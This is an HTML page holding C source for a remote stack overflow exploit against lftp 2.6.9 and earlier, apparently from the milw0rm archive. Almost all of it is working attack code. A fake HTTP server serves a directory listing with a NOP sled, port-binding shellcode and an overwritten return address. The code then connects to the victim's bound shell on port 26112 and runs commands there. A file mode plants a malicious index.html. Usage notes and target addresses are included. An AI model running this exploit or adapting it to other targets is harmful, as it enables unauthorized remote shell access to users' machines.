<html><head><title>lftp <= 2.6.9 Remote Stack based Overflow Exploit
</title></head><pre>/*
 * lftp remote stack-based overflow exploit by Li0n7 voila fr
 *
 * Vulnerability discovered by Ulf Harnhammar Ulf.Harnhammar.9485 student uu se
 *
 * Lftp versions later than 2.6.10 are prone to a remotly exploitable stack-based
 * overflow in try_netscape_proxy() and try_squid_eplf( (src/HttpDir.cc). This
 * bad coded proof-of-concept demonstrates the exploitation by exploiting the
 * vulnerable function try_netscape_proxy() (HttpDir.cc:358) and it needs more targets
 * to be efficient. Please note that this vulnerability is really hard to exploit
 * since lots of parameters come into play and are different from a platform to another,
 * for we have to overwrite some variables and registers before overwriting eip.
 * With some time and lot of patience, you should find your own parameters by using
 * GDB. Params to edit are marked with a '!' in the POC code. Moreover, I have edited
 * Bighawk's port binding shellcode not to contain any white character such as \r,\t,\v,
 * \f,\n or \20 because we are exploiting a sscanf function.
 *
 * usage: ./lftp-exp [-f &lt;path&gt;][-p &lt;port&gt;][-r &lt;ret&gt;][-t &lt;target&gt;]
 * -f &lt;path&gt;: create &lt;path&gt;index.html
 * -p &lt;port&gt;: run a fake lftp server on port &lt;port&gt; (default: 80)
 * -r &lt;ret&gt;: return address you would like to use
 * -t &lt;target&gt;: choose the target among the platforms available
 * Platforms supported are:
 * num: 0 - slack 9.0 - 0xbffff770
 *
 * For instance: ./lftp-exp -p 80 -t 0
 * ./lftp-exp -f / -t 0
 *
 * A poil !
 */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

#define BUFFERSIZE 117 /*!*/
#define SIZE 256

#define D_BACK 26112
#define D_RET 0xbffff770
#define D_PORT 80

#define DUMMY1 0xbffff140 /*!*/
#define DUMMY2 0xbffff810 /*!*/

#define OK &quot;cd ok, cwd=/\n&quot;


/* Edited bighawk 78 bytes portbinding shellcode */
/* size: 80 bytes */
/* Does not contain any white character i.e \r,\t,\v,\f,\n,\20 */

char shellcode[] =
&quot;\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0&quot;
&quot;\x66\x52\x50\xcd\x80\x43\x66\x53\x89\xe1\x6a\x10&quot;
&quot;\x51\x50\x89\xe1\x52\x50\xb0\x66\xcd\x80\x89\xe1&quot;
&quot;\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x89&quot;
&quot;\xd9\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x6e&quot;
&quot;\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53&quot;
&quot;\x89\xe1\xb0\x28\x2c\x1d\xcd\x80&quot;;

char badc0ded[] =
{0x20,0x09,0x0a,0x0b,0x0c,0x0d,0x00};

char *lftp_versions[] =
{
  &quot;lftp/2.3&quot;,
  &quot;lftp/2.4.9&quot;,
  &quot;lftp/2.5.2&quot;,
  &quot;lftp/2.6.0&quot;,
  &quot;lftp/2.6.3&quot;,
  &quot;lftp/2.6.4&quot;,
  &quot;lftp/2.6.5&quot;,
  &quot;lftp/2.6.6&quot;,
  &quot;lftp/2.6.7&quot;,
  &quot;lftp/2.6.8&quot;,
  &quot;lftp/2.6.9&quot;,
   
};

unsigned long ret_addr = D_RET;

int back_connection(long host);
int check_shellcode(char *host);
void check_version();
char * build(char *host);
int create_file(char *path);
void wait_connection(int port);
long resolve_host(u_char *host_name);
void die(char *argv);

struct os_ret_addr
{
  int num;
  char *plat;
  long ret;
};

struct os_ret_addr exp_os[]=
{
  {0,&quot;slack 9.0&quot;,0xbffff770},
  {0,NULL,0}
};


int
main(int argc,char *argv[])
{
  int i, option, port = D_PORT;
  long host = 0;
  char * option_list = &quot;f:p:r:t:&quot;, path[128];

  opterr = 0;

  if (argc &lt; 2) die(argv[0]);
  while((option = getopt(argc,argv,option_list)) != -1)
    switch(option)
    {
      case 'f':
      strncpy(path,optarg,sizeof(path)-1);
      path[sizeof(path)-1] = '\0';
      create_file(path);
      return 0;
      case 'p':
      port = atoi(optarg);
      if(port &gt; 65535 || port &lt; 0) exit(-1);
      break;
      case 'r':
      ret_addr = atol(optarg);
      if(ret_addr &gt; 0xbfffffff || ret_addr &lt; 0x00000000) exit(1);
      break;
      case 't':
      for(i=0; exp_os[i].plat != NULL; i++)
      if(atoi(optarg) &gt; i || atoi(optarg) &lt; 0)
      {
        fprintf(stderr,&quot; Platforms supported are:\n&quot;);
        for(i=0; exp_os[i].plat != NULL; i++)
          fprintf(stderr,&quot; num: %i - %s - 0x%x\n&quot;,i,exp_os[i].plat,exp_os[i].ret);
          exit(1);
      }
      ret_addr = exp_os[atoi(optarg)].ret;
      break;
      case '?':
      fprintf(stderr,&quot;[-] option \'%c\' invalid\n&quot;,optopt);
      die(argv[0]);
    }
 
  wait_connection(port);
  return 0;
}


int
check_shellcode(char *host)
{
  int i,j;
  for(i=0;i&lt;strlen(shellcode);i++)
    for(j=0;j&lt;strlen(badc0ded);j++)
      if(shellcode[i] == badc0ded[j])
      {
      fprintf(stderr,&quot;[%s] badc0ded shellcode!\n&quot;,host);
      return -1;
      }
  return 0;
}


void
check_version(char *version)
{
  int i;
  for(i=0;i&lt;sizeof(lftp_versions);i++)
    if(!strcmp(lftp_versions[i],version))
    {
      fprintf(stdout,&quot;(vulnerable).\n&quot;);
      return;
    }
  fprintf(stdout,&quot;(not vulnerable).\n&quot;);
  return;
}


char
*build(char *host)
{
  char *buffer,*ptr;
  int i;
  unsigned long *addr_ptr;

  fprintf(stdout,&quot;[%s] Building evil string to send (using ret 0x%x)...\n&quot;,host,ret_addr);

  buffer = (char *)malloc(SIZE+1);

  if(!buffer)
  {
    fprintf(stderr,&quot;[-] Can't allocate memory,exiting...\n&quot;);
    exit(1);
  }

  ptr = buffer;
  memset(ptr,0x90,BUFFERSIZE-strlen(shellcode));
  ptr += BUFFERSIZE-strlen(shellcode);

  if((i = check_shellcode(host)) &lt; 0) exit(1);

  for(i=0;i&lt;strlen(shellcode);i++)
    *ptr++ = shellcode[i];

  /* You might need to modify the padding too */
  addr_ptr = (long *)ptr;
  for(i=0;i&lt;24;i++)
   *(addr_ptr++) = DUMMY1;
  for(i=0;i&lt;8;i++)
   *(addr_ptr++) = DUMMY2;
  *(addr_ptr++) = ret_addr; /* EIP */
  *(addr_ptr++) = DUMMY2;

  ptr = (char *)addr_ptr;
  *ptr = 0x0;
  return buffer;
}


int
create_file(char *path)
{
  int fd;
  char buffer[512], file[256];
  ssize_t written;

  memset(file,0,256);
  memset(buffer,0,512);

  strcat(file,path);
  strcat(file,&quot;index.html&quot;);

  fd = open(file,O_WRONLY | O_CREAT | O_TRUNC,0644);
  if(fd &lt; 0)
  {
    fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
    exit(0);
  }
  snprintf(buffer,512,&quot;&lt;a href=\&quot;/\&quot;&gt;empty&lt;/a&gt; Fri May 30 10:09:06 2001 %s\n&quot;,build(&quot;+&quot;));
  written = write(fd,buffer,512);
  if(written != 512)
  {
    fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
    exit(0);
  }
  close(fd);
  fprintf(stdout,&quot;[+] File %s successfuly created.\n&quot;,file);
  return 0;
}


int
back_connection(long host)
{
  struct sockaddr_in s;
  u_char sock_buf[4096];
  fd_set fds;
  int fd,size;
  char *command=&quot;/bin/uname -a ; /usr/bin/id;\n&quot;;

  fd = socket(AF_INET, SOCK_STREAM, 0);
  if (fd &lt; 0)
  {
    fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
    exit(1);
  }

  s.sin_family = AF_INET;
  s.sin_port = htons(D_BACK);
  s.sin_addr.s_addr = host;

  if (connect(fd, (struct sockaddr *)&amp;s, sizeof(struct sockaddr)) == -1)
  {
    fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
    close(fd);
    return 0;
  }

  fprintf(stdout, &quot;[+] Let's rock on!\n&quot;);

  size = send(fd, command, strlen(command), 0);
  if(size &lt; 0)
  {
    fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
    close(fd);
    exit(1);
  }

  for (;;)
  {
    FD_ZERO(&amp;fds);
    FD_SET(0, &amp;fds);
    FD_SET(fd, &amp;fds);

    if (select(255, &amp;fds, NULL, NULL, NULL) == -1)
    {
      fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
      close(fd);
      exit(1);
    }

    memset(sock_buf, 0, sizeof(sock_buf));

    if (FD_ISSET(fd, &amp;fds))
    {
      if (recv(fd, sock_buf, sizeof(sock_buf), 0) == -1)
      {
      fprintf(stderr, &quot;[-] Connection closed by remote host,exiting...\n&quot;);
      close(fd);
      exit(1);
      }

      fprintf(stderr, &quot;%s&quot;, sock_buf);
    }

    if (FD_ISSET(0, &amp;fds))
    {
      read(0, sock_buf, sizeof(sock_buf));
      write(fd, sock_buf, strlen(sock_buf));
    }
  }
  return 0;
}


void
wait_connection(int port)
{
  struct sockaddr_in s;
  int size, fd, fd2, i, r, cancel = 0;
  char data[1024], version[32], request[512];
  char *ptr;
  long host = 0;

  memset(data,0,1024);

  fprintf(stdout,&quot;[+] Setting up a fake HTTP server...\n&quot;);
 
  fd = socket(AF_INET,SOCK_STREAM,0);
  if(fd &lt; 0)
  {
    fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
    exit(1);
  }

  s.sin_family = AF_INET;
  s.sin_port = htons(port);
  s.sin_addr.s_addr = 0;

  bind(fd,(struct sockaddr *) &amp;s,sizeof(s));
  listen(fd,1);
  size = sizeof(s);
  
  fprintf(stdout,&quot;[+] Awaiting connection on port %i\n&quot;,port);

  while(1)
  {
    cancel = 0;
    fd2 = accept(fd,(struct sockaddr *) &amp;s, &amp;size);

    if(!fork())
    {
      close(fd);
      while(1)
      {
      memset(data,0,1024);
      r = read(fd2,data,1024);
      if((ptr = strstr(data,&quot;User-Agent: lftp&quot;)) != NULL)
      {
        if(strstr(data,&quot;HEAD&quot;))
        {
          fprintf(stdout,&quot;[%s] HEAD request received.\n&quot;,inet_ntoa(s.sin_addr));
          size = send(fd2, OK, strlen(OK), 0);
          if(size &lt; 0)
          {
          fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
          close(fd2);
          exit(1);
          }
        }
        if(strstr(data,&quot;GET&quot;))
        {
          memset(request,0,512);
          memset(version,0,32);

          strncpy(version,ptr+12,10);
          version[sizeof(version)-1] = '\0';

          fprintf(stdout,&quot;[%s] GET request received.\n&quot;,inet_ntoa(s.sin_addr));
          fprintf(stdout,&quot;[%s] Remote version of lftp: %s &quot;,inet_ntoa(s.sin_addr),version);
          check_version(version);

          snprintf(request,512,&quot;HTTP/1.1 200 OK\n&quot;
                 &quot;Server: thttpd/2.21 20apr2001\n&quot;
                 &quot;Content-Type: text/html\n&quot;
                 &quot;Date: Sun, 21 Dec 2003 16:29:44 GMT\n&quot;
                 &quot;Last-Modified: Sun, 21 Dec 2003 16:23:41 GMT\n&quot;
                 &quot;Accept-Ranges: bytes\n&quot;
                 &quot;Connection: close\n\n&quot;
                 &quot;&lt;a href=\&quot;/\&quot;&gt;empty&lt;/a&gt;\tFri May 30 10:09:06 2001 %s\n&quot;,build((char*)inet_ntoa(s.sin_addr)));

          size = send(fd2, request, strlen(request), 0);
          if(size &lt; 0)
          {
          fprintf(stderr,&quot;[-] %s\n&quot;,strerror(errno));
          close(fd2);
          exit(1);
          }
          sleep(2);
          host = resolve_host((char *)inet_ntoa(s.sin_addr));
          back_connection(host);
          cancel = 1;
          break;
        }
      }
      }
      if(cancel == 1) break;
    }
    close(fd2);
  }
  return;
}


long resolve_host(u_char *host_name)
{
  struct in_addr addr;
  struct hostent *host_ent;

  addr.s_addr = inet_addr(host_name);
  if (addr.s_addr == -1)
  {
    host_ent = gethostbyname(host_name);
    if (!host_ent) return(0);
    memcpy((char *)&amp;addr.s_addr, host_ent-&gt;h_addr, host_ent-&gt;h_length);
  }

  return(addr.s_addr);
}


void
die(char *argv)
{
  int i;
  fprintf(stdout,&quot;\t Remote exploit for lftp &lt; 2.6.10 by Li0n7 \n&quot;);
  fprintf(stdout,&quot;\n usage: %s [-f &lt;path&gt;][-p &lt;port&gt;][-r &lt;ret&gt;][-t &lt;target&gt;]\n&quot;,argv);
  fprintf(stdout,&quot; -f &lt;path&gt;: create &lt;path&gt;index.html\n&quot;);
  fprintf(stdout,&quot; -p &lt;port&gt;: run a fake lftp server on port &lt;port&gt; (default: 80)\n&quot;);
  fprintf(stdout,&quot; -r &lt;ret&gt;: return address you would like to use\n&quot;);
  fprintf(stdout,&quot; -t &lt;target&gt;: choose the target among the platforms available\n&quot;);
  fprintf(stdout,&quot; Platforms supported are:\n&quot;);
  for(i=0; exp_os[i].plat != NULL; i++)
    fprintf(stderr,&quot; num: %i - %s - 0x%x\n&quot;,i,exp_os[i].plat,exp_os[i].ret);
  fprintf(stdout,&quot;\n Vulnerability discovered by Ulf Harnhammar &lt;Ulf.Harnhammar.9485@student.uu.se&gt; \n&quot;);
  fprintf(stdout,&quot; Contact me: Li0n7@voila.fr\n\n&quot;);
  exit(1);
}


// milw0rm.com [2004-01-14]</pre></html>